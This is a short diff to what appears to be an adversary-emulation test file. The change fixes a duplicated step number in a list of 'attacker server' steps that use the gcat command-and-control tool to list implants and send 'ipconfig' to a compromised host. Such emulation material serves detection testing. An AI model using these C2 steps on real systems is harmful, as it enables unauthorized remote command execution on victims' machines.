@@ -15,7 +15,7 @@ atomic_tests:
       3. implant.py
 
       공격자 서버
-      4. 4. cd /home/kali/Desktop/gcat/gcat-master
+      4. cd /home/kali/Desktop/gcat/gcat-master
       5. python gcat.py -list     
       6. python gcat.py -id <id> -cmd 'ipconfig'
       7. python gcat.py -id <id> -jobid <jobid> 
